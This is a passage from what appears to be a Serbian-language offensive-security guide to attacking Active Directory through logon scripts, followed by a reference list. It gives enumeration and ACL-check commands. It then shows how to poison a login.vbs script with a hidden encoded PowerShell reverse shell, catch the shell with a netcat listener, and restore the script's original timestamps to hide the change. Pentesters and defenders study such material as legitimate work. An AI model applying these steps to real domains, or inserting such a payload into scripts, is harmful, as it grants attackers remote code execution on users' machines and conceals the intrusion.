- Proverite atribute korisnika da biste videli da li je konfigurisana logon skripta:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Pretražite deljene resurse domena kako biste pronašli prečice ili reference na skripte:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Parsirajte `.lnk` datoteke da biste razrešili odredišta koja upućuju na SYSVOL/NETLOGON (koristan DFIR trik i za napadače bez direktnog pristupa GPO-u):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound prikazuje atribut `scriptPath` objekta korisnika za logon-script ako je prisutan. Logon-scripts konfigurisani putem GPO-a su zasebna referenca na policy, pa proverite i primenljivi GPO.

### Proverite dozvole za upis (ne oslanjajte se na prikaz deljenih resursa)
Automatizovani alati mogu prikazivati SYSVOL/NETLOGON kao read-only čak i kada tačna skripta ima drugačiji NTFS ACL. Počnite read-only pregledom te datoteke i njenog nadređenog direktorijuma; odgovarajući Allow ACE-ovi i dalje su kandidati jer su bitni efektivni SMB i NTFS pristup, Deny ACE-ovi i trenutni token:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Ovlašćeni test upisa treba da bude specifičan za cilj i reverzibilan, uz prethodno pravljenje rezervne kopije originalne skripte i njeno vraćanje. Nemojte prepisivati funkcionalnu skriptu za prijavu samo da biste testirali pristup; uspešan upis može da se izvrši pri sledećoj prijavi korisnika.

### Trovanje VBScript skripte za prijavu radi RCE
Dodajte komandu koja pokreće PowerShell reverse shell (generišite ga na revshells.com) i sačuvajte originalnu logiku da ne biste narušili poslovne funkcije:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Osluškujte na svom hostu i sačekajte sledeće interaktivno prijavljivanje:

```bash
rlwrap -cAr nc -lnvp 443
```

Napomene:
- Izvršavanje se odvija u kontekstu tokena korisnika koji vrši logovanje (ne SYSTEM). Opseg je veza GPO-a (OU, lokacija, domen) na koju se ta skripta primenjuje.
- Nakon upotrebe vratite prvobitni sadržaj i vremenske oznake.


## References

- [1] [Zloupotreba Active Directory ACL-ova/ACE-ova](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privilegovani nalozi i privilegije tokena](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Ažuriranje putanje napada ACL-om](https://wald0.com/?p=112)
- [4] [Nabrajanje ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Eskalacija privilegija pomoću ACL-ova u Active Directory-ju](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Skeniranje privilegija i privilegovanih naloga u Active Directory-ju](https://adsecurity.org/?p=3658)
- [7] [Konstruktor ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – operacije nad AD atributima/UAC-om iz Linux-a](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (članstvo u grupi)](https://www.samba.org/)
- [10] [HTB Puppy: zloupotreba AD ACL-ova, razbijanje KeePassXC Argon2 i dešifrovanje DPAPI-ja do administratorskog pristupa DC-u](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP oko tebe: preuzimanje UNC putanja GPO-a za izvršavanje koda i NTLM relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: iskorišćavanje Active Directory GPO-ova preko NTLM relay-a i još mnogo toga](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU se šališ? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: iskorišćavanje skrivenih vektora napada na ACL-ove organizacionih jedinica u Active Directory-ju](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulacija legitimnih Active Directory servisa na mreži: slučaj iskorišćavanja GPO-a](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — kretanje kroz OU i zloupotreba nasleđenih ACL-ova](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
